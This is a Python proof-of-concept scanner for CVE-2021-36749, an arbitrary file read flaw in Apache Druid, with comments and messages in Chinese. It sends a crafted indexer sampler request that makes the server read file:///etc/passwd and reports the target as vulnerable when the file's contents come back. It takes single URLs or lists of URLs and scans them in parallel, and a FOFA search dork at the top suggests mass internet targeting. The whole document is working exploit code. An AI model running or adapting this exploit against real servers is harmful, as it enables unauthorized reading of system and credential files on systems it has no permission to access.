#FOFA: body="Apache"

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json
import time

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': 'Apache Druid任意文件读取漏洞(CVE-2021-36749)',
        'vulnerable': False
    }
    vurl = urllib.parse.urljoin(target, '/druid/indexer/v1/sampler?for=connect')
    headers = {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8", "Origin": "http://130.59.118.184:8888",
        "Referer": "http://130.59.118.184:8888/unified-console.html", "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9", "Connection": "close"
    }
    json_data = {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "firehose": {"type": "http",
                                                                                                       "uris": [
                                                                                                           "file:///etc/passwd"]}},
                                           "dataSchema": {"dataSource": "sample", "parser": {"type": "string",
                                                                                             "parseSpec": {
                                                                                                 "format": "regex",
                                                                                                 "pattern": "(.*)",
                                                                                                 "columns": ["a"],
                                                                                                 "dimensionsSpec": {},
                                                                                                 "timestampSpec": {
                                                                                                     "column": "!!!_no_such_column_!!!",
                                                                                                     "missingValue": "2010-01-01T00:00:00Z"}}}}},
                 "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
    try:
        response = requests.post(vurl, headers=headers, json=json_data, timeout=3, verify=False, allow_redirects=False)
        response_text = response.text
        if 'root:x:0' in response_text:
            result['vulnerable'] = True
            result['url'] = target
            print(result)
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("Apache Druid任意文件读取漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()